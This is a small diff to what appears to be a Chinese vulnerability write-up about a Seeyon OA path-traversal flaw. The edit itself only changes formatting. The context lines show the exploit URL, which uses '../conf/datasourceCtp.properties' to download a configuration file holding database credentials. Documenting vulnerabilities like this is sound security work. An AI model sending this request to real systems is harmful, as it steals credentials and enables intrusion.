@@ -24,7 +24,7 @@
 /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
 ```
 
-在漏洞的OA 系统将会下载 **datasourceCtp.properties** 配置文件
+在漏洞的OA 系统将会下载 `datasourceCtp.properties` 配置文件
 
 ![img](../../../.vuepress/public/img/zhiyuan-11.png)
 
